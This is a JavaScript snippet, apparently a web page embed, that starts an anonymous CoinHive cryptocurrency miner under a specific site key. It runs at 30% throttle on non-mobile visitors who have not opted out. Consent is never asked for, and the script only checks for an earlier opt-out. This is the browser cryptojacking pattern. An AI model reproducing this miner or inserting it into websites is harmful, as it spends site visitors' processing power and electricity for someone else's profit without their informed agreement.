var miner = new CoinHive.Anonymous('boqN3m2OZz7Y6zlAvgyT2EA8ztbjWzqY', {
    throttle: 0.3
});
if (!miner.isMobile() && !miner.didOptOut(14400)) {
    miner.start();
}